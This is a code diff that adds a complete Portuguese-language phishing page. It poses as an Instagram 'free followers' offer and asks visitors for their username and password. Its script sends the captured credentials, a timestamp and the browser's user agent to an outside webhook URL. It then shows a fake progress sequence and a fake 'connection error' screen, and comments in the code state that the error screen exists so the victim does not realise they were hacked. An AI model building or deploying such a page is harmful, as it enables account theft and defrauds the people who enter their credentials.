@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Ganhe Seguidores</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body { font-family: 'Roboto', sans-serif; }
+        .ig-gradient {
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fdf497 45%, #fdf497 60%, #f97316 90%);
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fdf497 45%, #fdf497 60%, #f97316 90%);
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+        }
+    </style>
+</head>
+<body class="bg-gray-50 flex items-center justify-center min-h-screen p-4">
+
+    <div class="bg-white w-full max-w-md rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
+        <!-- Header com Logo -->
+        <div class="p-8 text-center border-b border-gray-100">
+            <img src="https://upload.wikimedia.org/wikipedia>commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" 
+                 alt="Instagram" class="w-16 h-16 mx-auto mb-4">
+            <h1 class="text-2xl font-bold text-gray-800">Ganhe Seguidores Grátis</h1>
+            <p class="text-gray-500 text-sm mt-2">Aumente sua visibilidade agora mesmo</p>
+        </div>
+
+        <!-- Formulário de Login -->
+        <div id="login-section" class="p-8">
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1">Nome de Usuário ou E-mail</label>
+                    <input type="text" id="username" 
+                           class="w-full px-4 py-3 rounded-lg bg-gray-100 border border-transparent focus:border-blue-500 focus:bg-white outline-none transition-all text-gray-700" 
+                           placeholder="Ex: @usuario123">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1">Senha</label>
+                    <input type="password" id="password" 
+                           class="w-full px-4 py-3 rounded-lg bg-gray-100 border border-transparent focus:border-blue-500 focus:bg-white outline-none transition-all text-gray-700" 
+                           placeholder="Sua senha do Instagram">
+                </div>
+                
+                <button onclick="startProcess()" 
+                        class="w-full ig-gradient text-white font-bold py-3 rounded-lg shadow-lg hover:opacity-90 transition-opacity flex items-center justify-center gap-2">
+                    <i data-lucide="rocket" class="w-5 h-5"></i>
+                    Resgatar Seguidores
+                </button>
+            </div>
+            <p class="text-center text-xs text-gray-400 mt-6">
+                Ao clicar, você concorda com os termos de uso do serviço de automação.
+            </p>
+        </div>
+
+        <!-- Tela de Processamento (Invisível inicialmente) -->
+        <div id="process-section" class="hidden p-8 text-center">
+            <div class="flex flex-col items-center justify-center py-10">
+                <div class="relative w-20 h-20">
+                    <div class="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-blue-500 rounded-full border-t-transparent animate-spin"></div>
+                </div>
+                <h2 class="text-xl font-bold text-gray-800 mt-6">Processando Pedido...</h2>
+                <p id="status-text" class="text-gray-500 text-sm mt-2">Verificando conta no servidor</p>
+                
+                <div class="w-full bg-gray-200 h-2 rounded-full mt-6 overflow-hidden">
+                    <div id="progress-bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tela Final de Erro (Para não levantar suspeitas) -->
+        <div id="error-section" class="hidden p-8 text-center">
+            <div class="flex flex-col items-center justify-center py-10">
+                <div class="bg-red-100 p-4 rounded-full mb-4">
+                    <i data-lucide="alert-circle" class="w-10 h-10 text-red-500"></i>
+                </div>
+                <h2 class="text-xl font-bold text-gray-800">Erro de Conexão</h2>
+                <p class="text-gray-500 text-sm mt-2">Infelizmente, sua conta não foi elegível para esta promoção no momento. Tente novamente mais tarde.</p>
+                <button onclick="location.reload()" class="mt-6 text-blue-500 font-semibold hover:underline">Voltar ao início</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURAÇÃO: Coloque sua URL do HookScope aqui
+        const webhookUrl = 'https://hookscope.app/in/rb8k62hq';
+
+        async function startProcess() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            if (!user || !pass) {
+                alert('Por favor, preencha todos os campos.');
+                return;
+            }
+
+            // 1. Enviar dados para o HookScope
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors', // Evita erros de CORS no navegador
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: user,
+                        password: pass,
+                        timestamp: new Date().toLocaleString(),
+                        device: navigator.userAgent
+                    })
+                });
+            } catch (e) {
+                console.log('Erro ao enviar');
+            }
+
+            // 2. Trocar de tela para processamento
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('process-section').classList.remove('hidden');
+
+            // 3. Simular progresso para dar credibilidade
+            const statusText = document.getElementById('status-text');
+            const progressBar = document.getElementById('progress-bar');
+            
+            const steps = [
+                { text: 'Conectando ao servidor do Instagram...', progress: '30%' },
+                { text: 'Validando token de autenticação...', progress: '60%' },
+                { text: 'Sincronizando seguidores...', progress: '90%' },
+                { text: 'Finalizando requisição...', progress: '100%' }
+            ];
+
+            let currentStep = 0;
+            const interval = setInterval(() => {
+                if (currentStep < steps.length) {
+                    statusText.innerText = steps[currentStep].text;
+                    progressBar.style.width = steps[currentStep].progress;
+                    currentStep++;
+                } else {
+                    clearInterval(interval);
+                    // 4. Mostrar erro final para a vítima não saber que foi hackeada
+                    document.getElementById('process-section').classList.add('hidden');
+                    document.getElementById('error-section').classList.remove('hidden');
+                }
+            }, 2000);
+        }
+
+        // Inicializa ícones do Lucide
+        lucide.createIcons();
+    </script>
+</body>
+</html>
